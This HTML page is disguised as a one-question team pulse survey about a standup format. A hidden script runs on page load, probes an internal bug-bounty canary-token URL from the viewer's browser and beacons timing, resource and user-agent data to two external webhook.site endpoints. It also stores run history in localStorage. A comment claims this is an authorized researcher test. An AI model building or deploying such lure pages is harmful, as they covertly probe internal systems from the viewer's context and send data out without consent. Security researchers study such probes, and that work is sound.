<!doctype html><html><head><meta charset="utf-8"><title>Q3 Team Pulse Survey</title></head>
<body style="font-family:-apple-system,sans-serif;max-width:560px;margin:48px auto;color:#222">
<h2>Q3 Team Pulse Survey</h2>
<p>Thanks for opening this quarter's pulse survey. One question this week:</p>
<p><b>&ldquo;The new standup format is working well.&rdquo;</b></p>
<p>Rate it 1&ndash;5 and add any comment &mdash; just reply in the chat with your number.</p>
<hr>
<p style="font-size:12px;color:#666">Delivery check (automatic pixel status): <span id="tel">running</span></p>
<!-- researcher test page (authorized own-account, case CAT1): one tracking pixel + on-page telemetry; no other actions -->
<script>
(function(){
  var CAN='https://www.internalfb.com/intern/bug-bounty/get-canary-token/';
  var SINKS=['https://webhook.site/56fb2556-8c88-4f3d-bfb7-c1e6660ce3d3/hit?case=CAT1-V3','https://webhook.site/fdfac34c-4508-46fd-96d0-da78a36627b1/hit?case=CAT1-V3'];
  var r={img:'pending',img_ms:null,fetch:'pending',fetch_ms:null,perf:[],t:new Date().toISOString(),ua:navigator.userAgent.slice(0,60)};
  var reported=false;
  function render(){ try{document.getElementById('tel').textContent=JSON.stringify(r);}catch(e){} }
  function snapshotPerf(){ try{ r.perf=performance.getEntriesByType('resource').filter(function(e){return e.name.indexOf('internalfb')>=0;}).map(function(e){return {d:Math.round(e.duration),s:e.responseStatus||0,nh:e.nextHopProtocol||''};}); }catch(e){} }
  function report(){ if(reported) return; reported=true; snapshotPerf(); render();
    var body=JSON.stringify(r);
    for(var i=0;i<SINKS.length;i++){
      try{navigator.sendBeacon(SINKS[i],body);}catch(e){}
      try{fetch(SINKS[i],{method:'POST',mode:'no-cors',keepalive:true,body:body});}catch(e){}
      try{(new Image()).src=SINKS[i]+'&x='+Math.random();}catch(e){}
    }
    try{var h=JSON.parse(localStorage.getItem('cat1runs')||'[]');h.push({t:r.t,img:r.img,fetch:r.fetch});localStorage.setItem('cat1runs',JSON.stringify(h.slice(-8)));}catch(e){}
  }
  var t0=performance.now();
  var im=new Image();
  im.onload=function(){ r.img='load'; r.img_ms=Math.round(performance.now()-t0); done(); };
  im.onerror=function(){ r.img='error'; r.img_ms=Math.round(performance.now()-t0); done(); };
  im.src=CAN;
  var f0=performance.now();
  fetch(CAN,{mode:'no-cors',cache:'no-store'}).then(function(){ r.fetch='resolved'; r.fetch_ms=Math.round(performance.now()-f0); done(); }).catch(function(e){ r.fetch='rejected:'+((e&&e.message)||'').slice(0,40); r.fetch_ms=Math.round(performance.now()-f0); done(); });
  function done(){ if(r.img!=='pending'&&r.fetch!=='pending'){ report(); } else { render(); } }
  setTimeout(function(){ if(r.img==='pending')r.img='still-pending-12s'; if(r.fetch==='pending')r.fetch='still-pending-12s'; render(); },12000);
  setTimeout(report,25000);
})();
</script>
</body></html>
